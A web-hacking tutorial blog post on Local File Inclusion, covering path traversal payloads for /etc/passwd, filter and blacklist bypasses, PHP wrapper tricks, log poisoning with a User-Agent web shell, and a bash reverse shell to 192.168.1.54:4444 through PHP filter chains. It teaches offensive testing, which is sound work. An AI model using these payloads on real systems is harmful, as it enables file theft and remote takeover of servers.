---
title: Local File Inclusion (LFI).
categories: [Tutorial, HackingWeb, LFI]
tags: [LFI, tutorial]
description: Local File Inclusion Tutorial; Bypasses, how to obtain RCE from LFI...
---

> This is just a basic tutorial. I strongly recommend you visit my GitHub account if you want to find more information on this topic.
[Github-Hacking Web.](https://github.com/PentesterArchive/Hacking-Web)
{: .prompt-tip }

## Local File Inclusion.
This vulnerability ***enable an attacker to read arbitrary files on the server that is running an application***. <br />
In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server. 

### Reading arbitrary files.
Imagine a shopping application that displays images of items for sale. This might load an image using the following HTML:<br />
`<img src="/loadImage?filename=218.png">`<br />
The loadImage **URL takes a filename parameter and returns the contents of the specified file**. The image files are stored on disk in the location `/var/www/images/`. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In other words, the application reads from the following file path:<br />
`/var/www/images/218.png`<br /><br />
This application implements no defenses against path traversal attacks. As a result, an attacker can request the following URL to retrieve the `/etc/passwd` file from the server's filesystem:<br />
`https://insecure-website.com/loadImage?filename=../../../etc/passwd`<br /><br />

----------------------------------------------------

## LFI Types, Serialization and Bypasses.
### Absolut Path traversal.
In this type of Path traversal, results can be obtained by using the absolute path:<br />
`https://insecure-website.com/loadImage?filename=/etc/passwd`

### Relative Path traversal.
`https://insecure-website.com/loadImage?filename=../../../etc/passwd`

### Non-Recursive Sanitization Traversal.
In some cases, serialization techniques detect the path `../` and delete it. We can bypass this by doubling it and using `....//`:<br />
`https://insecure-website.com/loadImage?filename=....//....//....//....//etc/passwd`

### Black list bypass.
In other cases the server may have a black list that find some maches and invalidate them like `passwd`. We can bypass it using regular expresions `pass*`: <br />
- `https://insecure-website.com/loadImage?filename=....//....//....//....//etc/pass*`<br />
- `https://insecure-website.com/loadImage?filename=../../../../../etc/ho?ts`<br />
- `https://insecure-website.com/loadImage?filename=../../../../../e??/pa????`<br />


### Null byte Path Traversal.
Sometimes the developer may concatenate an exension to the file being searched. In this case, if we attempt to obtain the `/etc/passwd` , we might actually be searching for `/etc/passwd.php`. We can avoid this technique (Only if the PHP version is outdated) by using a null byte to override the extension.<br />
>  PHP solved this type of bypass since the version 5.3.4.<br />

`https://insecure-website.com/loadImage?filename=../../../../../etc/passwd%00`<br />

### Extension validation.
It's possible to configure the server to search only for the files with a especific exetension. For example, the target may only display a file if its extension is not `.txt`. <br />
We can bypass this type of restriction in outdated PHP versions by using `./`.<br />
![2](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/158c34c8-3339-4974-9a9d-f931b0e55527)<br />
![3](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/0e7bc4b8-790b-4372-9e17-62dd812909de)

----------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------

## Reading PHP files using Wrappers.
The target server can interpret the PHP language. That's why, if we try to deploy a `.php` file, we can not see it. In these scenarios, we need to use PHP wrappers. <br />

### Base64-encode Wrapper:
To view PHP files, we can deploy them in base64 using the following wrapper: <br />
`php://filter/convert.base64-encode/resource=<FILE>`
- First, we have to make sure if the server is concatenating the extension or not:
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/0ada0fd0-bcf6-4ad0-b4d6-dc8ec0153e40" alt="img">
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/4d845f2b-9acc-482e-8d7d-b48b7ae97b8d" alt="img" width="700">
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/f17c99dc-36a3-4a19-88bb-10f9b3d5b93b" alt="img" width="600">


- We use the wrapper (We dont use .php to search for the file because we saw that the web is adding the extension by it self). <br />
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/c42f2d73-e3f7-4911-bfc8-c1c41b68b14c" alt="img">


- The last step is to decode the base64 output.




### convert.iconv
We can also read PHP files with the next line.
`php://filter/convert.iconv.utf-8.utf-16/resource=<Filename>`
![10](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/2be76dad-fccf-405f-99f8-0f6dd002e8f8)



## From LFI to RCE.

### RCE via PHP Wrappers
#### php://input
We have to change the method request to POST.<br />
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/5f3d5024-5d4a-4081-bdb3-a49adf45dea9" alt="img" width="450">
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/2f535f36-3959-4767-b354-d69f19068336" alt="img" width="500">


![Wrapper3](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/dedf5a5c-a25a-4ba8-89d6-7061ccb9a264)



#### data://text/plain;base64,
In this example we use `<?php system("whoami"); ?>` in Base64. Sometimes we will need to URL encode it.<br />
`data://text/plain;base64,<BASE64>`.<br />
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/dae0bea9-c892-4dcf-b25c-063d2bce36d9" alt="img" width="450">

![14](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/9299cecc-3ce8-415b-8580-af767f54be04)

##### Example 2:
In some cases as follows we will need to URL encode the base64.<br />
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/41099e8f-01c0-43c0-83b1-7f422a8d4580" alt="img" width="300">
![16](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/f5300def-5c56-4065-9182-8ac3c251f5be)










### Log Poisoning.
In any server, there are files that register logs. When we find a [Local File Inclusion](https://github.com/alejandro-pentest/Hacking-Web/tree/main/Local%20File%20Inclusion-Path%20traversal) vulnerability we can attempt to inject code into these files and then execute it.

#### Detection.
To detect if we can perform Log Poisoning, we need to attempt to manipulate any log file.
> Log server files are tipically stored in `/var/log`:<br />
- `/var/log` on the target system:
![1](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/e41f5f0d-94f3-40d4-8614-77c4cb7fd76c)
- Deploying `/var/log/apache2/acces.log` taking advantage of a LFI vulnerability:
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/76c1609e-2a9c-4596-9efb-89b2f269749c" alt="img" width="30000"><br />
- Any action we perform on the server will be logged there. <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/2b395c06-939d-43b7-9861-4dbc95ff5795" alt="img" width="2500">

#### Exploitation.
We can attempt to modify the `User-Agent` of our requests to visualize in the logs the information we want. <br />
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/c002b371-ca10-4a5a-927e-ff92cbb5e311" alt="img" width="500">
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/684b6e72-457b-4f10-a8c9-2a652dafd37c" alt="img" width="2000">

##### Executing commands: 
- If we try to inject some code in the log, the server may execute it, as we can see in the following example: <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/832b87ff-b54d-408a-93cf-7de6c2fa5f73" width="600"> <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/8a83e19d-a9db-4db9-a902-09b4f662e09c" width="2500" alt="img">

##### Reverse shell: 
- Using the previous method, we can obtain a reverse shell.
> It's important to insert the poison as follows because we need to scape the character `$`. If we provide an incorrect input, we can break the Log Poisoning technique and we may not be able to exploit it. `"User-Agent: <?php system(\$_GET['cmd']); ?>"`. <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/df8723f6-9ae5-446a-915c-e123f95a199a" alt="img" width="600"> ![10](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/b9587167-cec8-4811-91ed-0ec7570a4e42)






----------------------


### PHP Filter Chain.
We have to `git clone` the next repository: [https://github.com/synacktiv/php_filter_chain_generator/tree/main].
We make the chain specifyng the command we want to introduce in the target and we used it in the vulnerable filename input.

### LFI 2 RCE.
![1](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/2956e425-1116-473f-b2cd-4be072498ab6)
![3](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/01c597ca-cb77-4c1e-825d-e2694a0e246f)

### Reverse shell via PHP Filter Chain.
It's important to URLencode the `&` as `%26`. `bash -c "bash -i >%26 /dev/tcp/192.168.1.54/4444 0>%261"`.
![4](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/0843c1da-f798-48fa-a4fa-ca95c82b408e)
![5](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/1deb2f94-2a7f-43de-9ae2-47aebc1b4769)
